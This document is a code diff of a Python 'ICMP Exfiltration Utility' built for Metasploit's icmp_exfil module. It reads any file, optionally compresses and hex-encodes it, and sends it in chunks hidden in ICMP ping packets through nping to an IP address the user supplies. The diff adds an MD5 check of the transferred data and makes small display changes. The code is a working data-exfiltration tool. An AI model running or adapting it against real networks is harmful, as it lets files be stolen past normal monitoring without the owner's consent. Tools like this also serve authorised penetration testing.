@@ -12,6 +12,7 @@ import os
 
 debug = 0
 nping = ''
+exfilhash = ''
 # https://raw.githubusercontent.com/todb/junkdrawer/master/exfiltrate-data.rb
 # https://community.rapid7.com/community/metasploit/blog/2014/01/01/fun-with-icmp-exfiltration
 #TODO Add size for payload
@@ -42,26 +43,21 @@ def readfile(filename):
 def exfildata(ipaddress, file, compress, npinglocation, chunksize):
     status = True
     error = ''
-    
+    global exfilhash
     chunksize = 2048
     x = 0
     subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 --data-string "BOF' + str(file) + '"',
                     stdout=None)
-    # if not compress:
-    # for b in bytes_from_file(file):
-    #         data = binascii.hexlify(bytearray(b))
-    #         hex_string = "".join("%02x" % b for b in data)
-    #         subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 -data ' + hex_string,
-    #                         stdout=None)
-    #else:
     data = readfile(file)
     if compress:
         new_data = zlib.compress(data)
     else:
         new_data = data
     hexdata = binascii.hexlify(bytearray(new_data))
+    exfilhash = (hashlib.md5(hexdata).hexdigest())
     hex_string = "".join("%02x" % b for b in hexdata)
     chunks = int(round(len(hex_string) / chunksize))
+
     for i in range(len(hex_string)):
         chunk = hex_string[x:chunksize + x]
         if chunk:
@@ -131,6 +127,7 @@ def npingcheck():
 
 
 def Header(ipaddress, file, compress, chunksize):
+    global exfilhash
     print('')
     print('+--------------------------------------------------------------------------+')
     print('|ICMP Exfiltration Utility                                                 |')
@@ -146,11 +143,14 @@ def Header(ipaddress, file, compress, chunksize):
     if compress:
         print('| Compression enabled.                                                     |')
     if chunksize >= 1:
-        print('| Size of chunk: ' + str(chunksize) + '                             |')
+        print('| Size of chunk: ' + str(chunksize).ljust(58) + '|')
     print('+--------------------------------------------------------------------------+')
 
 
 def Completed():
+    print('+--------------------------------------------------------------------------+')
+    print('| Transferred file MD5: ' + str(exfilhash).ljust(51) + '|')
+    print('+--------------------------------------------------------------------------+')
     print('| [*] Completed.                                                           |')
     print('+--------------------------------------------------------------------------+')
 
@@ -171,8 +171,8 @@ def main(argv):
     parser = argparse.ArgumentParser(description="ICMP exfiltration utility for Metasploit icmp_exfil.", add_help=True)
     parser.add_argument('-i', '--ipaddress', help='The destination IP Address.', required=True)
     parser.add_argument('-f', '--file', help='The file to exfiltrate.', required=True)
-    parser.add_argument('-s', '--size', help='Size of data packet (This will be double due to encoding).',
-                        required=False)
+    #parser.add_argument('-s', '--size', help='Size of data packet (This will be double due to encoding).',
+    #                    required=False)
     parser.add_argument('-c', '--compress',
                         help='Enable zlib compression. To retrieve "cat <file> | xxd -r -ps | openssl zlib -d | tee >(md5sum) > <outfile>"',
                         action='store_true', required=False)
@@ -184,8 +184,8 @@ def main(argv):
         file = args.file
     if args.compress:
         compress = True
-    if args.size:
-        chunksize = int(args.size)
+    #if args.size:
+    #    chunksize = int(args.size)
     Header(ipaddress, file, compress, chunksize)
     print('| [#] Checking for nping.                                                  |')
     status, error = npingcheck()
@@ -222,7 +222,6 @@ def main(argv):
 
 
 main(sys.argv[1:])
-
 
 
 
